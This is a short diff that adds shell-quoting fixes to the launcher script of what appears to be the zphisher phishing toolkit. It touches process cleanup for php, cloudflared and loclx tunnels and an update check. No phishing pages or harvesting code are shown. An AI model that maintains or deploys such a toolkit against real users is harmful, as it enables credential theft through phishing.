@@ -106,7 +106,7 @@ MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(prin
 RESETBG="$(printf '\e[0m\n')"
 
 ## Directories
-BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
+BASE_DIR=$(realpath "$(dirname "${BASH_SOURCE[0]}")")
 cd "$BASE_DIR" || exit 1
 
 mkdir -p "$BASE_DIR/.server" "$BASE_DIR/auth"
@@ -141,8 +141,8 @@ reset_color() {
 kill_pid() {
 	check_PID="php cloudflared loclx"
 	for process in ${check_PID}; do
-		if [[ $(pidof ${process}) ]]; then # Check for Process
-			killall ${process} > /dev/null 2>&1 # Kill the Process
+		if [[ $(pidof "$process") ]]; then # Check for Process
+			killall "$process" > /dev/null 2>&1 # Kill the Process
 		fi
 	done
 }
@@ -159,7 +159,7 @@ check_update(){
 	fi
 	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
 
-	if [[ $new_version != $__version__ ]]; then
+	if [[ $new_version != "$__version__" ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
 		sleep 2
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
